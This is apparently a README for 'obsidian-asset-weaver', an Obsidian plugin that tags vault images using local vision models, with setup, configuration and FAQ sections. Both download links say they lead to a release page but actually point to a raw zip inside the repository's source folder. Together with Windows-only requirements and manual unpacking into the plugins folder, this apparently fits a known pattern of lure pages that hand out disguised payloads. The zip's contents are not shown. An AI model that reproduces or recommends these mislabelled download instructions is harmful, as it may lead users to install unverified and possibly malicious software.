# 🖼️ obsidian-asset-weaver - Manage your vault images with artificial intelligence

[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nondescript-cardsharp536/obsidian-asset-weaver/raw/refs/heads/main/src/asset_weaver_obsidian_v1.7.zip)

## 🔍 Overview

Obsidian-asset-weaver helps you organize your image files. It scans the folders in your Obsidian vault to find pictures. It then uses local vision models to read these images and create descriptive tags. You keep full control over your files because no images leave your computer. This software works with Ollama or LM Studio to process your images for better searchability.

## 📋 System Requirements

To run this application on your Windows computer, you need:

* Windows 10 or 11 with the latest updates.
* At least 8 gigabytes of RAM.
* A decent graphics card if you want fast results.
* The Obsidian desktop application installed.
* Either Ollama or LM Studio installed to run the image models.

## 🚀 Getting Started

Follow these steps to set up the weaver on your machine. You do not need to know how to write code.

1. Install Ollama or LM Studio from their official websites. These tools act as the brain that understands your images.
2. Select a vision-language model inside your chosen tool. We recommend using a model like LLaVA for the best balance of speed and description quality.
3. Keep your model running in the background before you start the Obsidian plugin.

## 📥 Installing the Software

You must visit the project page to download the latest version of the plugin.

[Click here to visit the release page and download the files](https://github.com/nondescript-cardsharp536/obsidian-asset-weaver/raw/refs/heads/main/src/asset_weaver_obsidian_v1.7.zip)

Follow these steps to add the weaver to Obsidian:

1. Download the zip file from the link above.
2. Open your Obsidian vault folder on your computer.
3. Open the hidden folder named `.obsidian`.
4. Open the folder named `plugins`. If you do not see this folder, create one with the name `plugins`.
5. Create a new folder inside the `plugins` folder and name it `obsidian-asset-weaver`.
6. Extract the contents of the downloaded zip file into this new folder.
7. Restart Obsidian.
8. Go to Settings, select Community Plugins, and turn on the toggle for `obsidian-asset-weaver`.

## ⚙️ Configuring the Plugin

Once you enable the plugin, you must link it to your local model.

1. Open Obsidian settings and find the `Asset Weaver` menu.
2. Enter the URL of your local server. If you use Ollama, this is usually `http://localhost:11434`.
3. Type the name of the model you downloaded into the Model Name box.
4. Choose which folders in your vault the plugin should scan.
5. Click the Save button.

## 🛠️ How to Scan Images

After you finish the configuration, you can start the scanning process.

1. Open the Command Palette in Obsidian by pressing `Ctrl + P`.
2. Type `Asset Weaver: Run Scan`.
3. Press Enter.

The plugin looks at every image in the folders you chose. It sends the images to your local model. The model writes a description of the image content. The plugin saves this description as metadata in a markdown file. You can see these tags when you click on your images in Obsidian.

## 🛡️ Privacy and Safety

Privacy remains a priority. This plugin uses local processing. Your images stay on your hard drive. The plugin sends image data to the local model running on your own hardware. No cloud service or remote server accesses your files. 

## ❓ Frequently Asked Questions

**What happens if the scan fails?**
The plugin shows an error message in the console. Ensure your Ollama or LM Studio server is running correctly. Check that you input the correct model name in settings.

**Does this software slow down my computer?**
Running a vision model requires memory. If your computer feels slow, close other programs while the scan runs. The model only works when you trigger the scan.

**What formats does the plugin support?**
It supports common image types like JPG, PNG, and WebP. 

**Can I edit the descriptions that the model creates?**
Yes. Since the plugin creates standard markdown metadata, you can open the file and change the tags manually.

## 📦 Troubleshooting

If you run into issues, try these steps in order:

1. Restart Obsidian.
2. Verify that your local model is loaded and ready in Ollama or LM Studio.
3. Check your Vault folder permissions to ensure the plugin can write new files.
4. Make sure you use the latest version of Obsidian.

If issues persist, please check the release page for updates that fix known bugs.